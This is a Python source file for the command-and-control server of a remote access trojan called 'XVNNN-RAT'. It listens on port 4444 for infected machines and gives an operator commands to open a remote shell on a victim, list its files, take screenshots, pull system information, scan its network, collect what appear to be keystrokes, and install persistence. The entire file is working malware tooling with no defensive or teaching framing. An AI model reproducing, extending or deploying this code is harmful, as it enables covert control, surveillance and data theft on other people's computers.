#!/usr/bin/env python3
"""
XVNNN-RAT Headless Server
Author: Ali Zafar (alizafarbati@gmail.com)
Version: 1.0.0

CLI-based server for systems without GUI.
"""

import socket
import threading
import time
import sys
import os
import base64
import json
import logging

# Add src to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.network import send_json, receive_json

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class HeadlessServer:
    """CLI-based server for XVNNN-RAT"""
    
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = []
        self.running = False
    
    def start_server(self):
        """Start the server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            logger.info(f"Server started on {self.host}:{self.port}")
            logger.info("Waiting for connections...")
            
            accept_thread = threading.Thread(target=self.accept_connections, daemon=True)
            accept_thread.start()
        except Exception as e:
            logger.error(f"Error starting server: {e}")
    
    def accept_connections(self):
        """Accept incoming connections"""
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                client_info = {
                    'socket': client_socket,
                    'addr': addr,
                    'id': len(self.clients) + 1,
                    'hostname': None,
                    'os': None
                }
                
                try:
                    send_json(client_socket, {"type": "info"})
                    response = receive_json(client_socket)
                    if response:
                        client_info.update(response)
                except:
                    pass
                
                self.clients.append(client_info)
                logger.info(f"Connection from {addr[0]}:{addr[1]} - ID: {client_info['id']} ({client_info.get('hostname', 'Unknown')})")
                
                client_thread = threading.Thread(target=self.handle_client, args=(client_info,), daemon=True)
                client_thread.start()
            except Exception as e:
                if self.running:
                    logger.error(f"Accept error: {e}")
    
    def handle_client(self, client_info):
        """Handle client connection"""
        try:
            while self.running and client_info['socket'] in [c['socket'] for c in self.clients]:
                client_info['socket'].recv(1024)
        except:
            pass
        finally:
            if client_info in self.clients:
                self.clients.remove(client_info)
                logger.info(f"Client {client_info['id']} disconnected")
    
    def send_command(self, client_id, command_type, data=None):
        """Send command to client"""
        client = next((c for c in self.clients if c['id'] == client_id), None)
        if not client:
            logger.warning(f"Client {client_id} not found")
            return None
        
        try:
            message = {"type": command_type}
            if data:
                message.update(data)
            
            send_json(client['socket'], message)
            
            if command_type in ['shell', 'list_files', 'download', 'screenshot',
                               'process_list', 'system_info', 'network_scan', 'get_keys', 'cmd_persist']:
                return receive_json(client['socket'])
        except Exception as e:
            logger.error(f"Error sending command to client {client_id}: {e}")
            if client in self.clients:
                self.clients.remove(client)
        
        return None
    
    def list_clients(self):
        """List connected clients"""
        print("\nConnected Clients:")
        print("-" * 50)
        for client in self.clients:
            print(f"ID: {client['id']} - {client.get('hostname', 'Unknown')} ({client.get('os', 'Unknown')}) - {client['addr'][0]}")
        print("-" * 50)
    
    def interactive_shell(self, client_id):
        """Interactive shell for client"""
        client = next((c for c in self.clients if c['id'] == client_id), None)
        if not client:
            print(f"Client {client_id} not found")
            return
        
        print(f"\nInteractive shell for client {client_id} (type 'exit' to quit)")
        while True:
            try:
                cmd = input(f"shell@{client_id}> ")
                if cmd.lower() == 'exit':
                    break
                
                result = self.send_command(client_id, 'shell', {'command': cmd})
                if result and 'output' in result:
                    print(result['output'])
                else:
                    print("No output received")
                    
            except KeyboardInterrupt:
                print("\nExiting shell...")
                break
            except Exception as e:
                print(f"Error: {e}")
    
    def run_interactive(self):
        """Run interactive interface"""
        print("\n" + "="*60)
        print("XVNNN-RAT v1.0.0 - Headless Server")
        print("="*60)
        print("Commands:")
        print("  list                  - List connected clients")
        print("  shell N               - Open shell for client N")
        print("  files N               - List files on client N")
        print("  screen N              - Screenshot client N")
        print("  info N                - System info from client N")
        print("  persist N METHOD      - Add persistence to client N")
        print("  stop                  - Stop server")
        print("  exit                  - Exit")
        print("="*60 + "\n")
        
        while self.running:
            try:
                cmd = input("xvn> ").strip()
                parts = cmd.split()
                
                if not parts:
                    continue
                
                action = parts[0].lower()
                
                if action == 'list':
                    self.list_clients()
                
                elif action == 'shell' and len(parts) > 1:
                    try:
                        client_id = int(parts[1])
                        self.interactive_shell(client_id)
                    except ValueError:
                        print("Invalid client ID")
                
                elif action == 'files' and len(parts) > 1:
                    try:
                        client_id = int(parts[1])
                        result = self.send_command(client_id, 'list_files', {'path': ''})
                        if result and 'files' in result:
                            print("\nFiles:")
                            for f in result['files']:
                                print(f"  {f}")
                    except ValueError:
                        print("Invalid client ID")
                
                elif action == 'screen' and len(parts) > 1:
                    try:
                        client_id = int(parts[1])
                        result = self.send_command(client_id, 'screenshot')
                        if result and 'image' in result:
                            filename = f"screenshot_client{client_id}_{int(time.time())}.png"
                            with open(filename, 'wb') as f:
                                f.write(base64.b64decode(result['image']))
                            print(f"Screenshot saved as {filename}")
                        else:
                            print("Screenshot failed")
                    except ValueError:
                        print("Invalid client ID")
                
                elif action == 'info' and len(parts) > 1:
                    try:
                        client_id = int(parts[1])
                        result = self.send_command(client_id, 'system_info')
                        if result and 'info' in result:
                            print("\nSystem Info:")
                            for key, value in result['info'].items():
                                print(f"  {key}: {value}")
                    except ValueError:
                        print("Invalid client ID")
                
                elif action == 'persist' and len(parts) >= 3:
                    try:
                        client_id = int(parts[1])
                        method = parts[2]
                        result = self.send_command(client_id, 'cmd_persist', {'method': method})
                        if result and result.get('status') == 'success':
                            print(f"Persistence added using {method}")
                        else:
                            print(f"Persistence failed: {result.get('error', 'Unknown')}")
                    except ValueError:
                        print("Invalid client ID or method")
                
                elif action == 'stop':
                    self.running = False
                    print("Server stopped")
                    break
                
                elif action == 'exit':
                    self.running = False
                    print("Exiting...")
                    break
                
                else:
                    print("Unknown command or invalid syntax")
                    
            except KeyboardInterrupt:
                print("\nStopping server...")
                self.running = False
                break
            except Exception as e:
                print(f"Error: {e}")
    
    def run(self):
        """Run server"""
        self.start_server()
        time.sleep(1)
        self.run_interactive()

if __name__ == "__main__":
    server = HeadlessServer()
    server.run()